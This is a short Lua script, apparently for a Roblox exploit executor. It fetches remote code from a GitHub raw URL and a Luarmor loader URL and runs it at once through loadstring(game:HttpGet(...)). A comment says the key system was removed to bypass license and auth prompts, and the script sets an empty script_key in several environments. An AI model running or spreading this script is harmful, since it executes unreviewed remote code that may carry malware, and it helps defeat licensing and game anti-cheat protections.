local loader = loadstring(game:HttpGet("https://raw.githubusercontent.com/4lpaca-pin/Arceney/refs/heads/main/modules/loader.luau"))();
local url = "https://api.luarmor.net/files/v3/loaders/8486e989be72819a23bd64c7ce286e53.lua";

-- Key system removed: bypassing license/auth prompts
script_key = script_key or ""
getfenv().script_key = script_key
getgenv().script_key = script_key
-- Load remote loader immediately (pass current/empty script_key)
loadstring(game:HttpGet(url))(script_key)
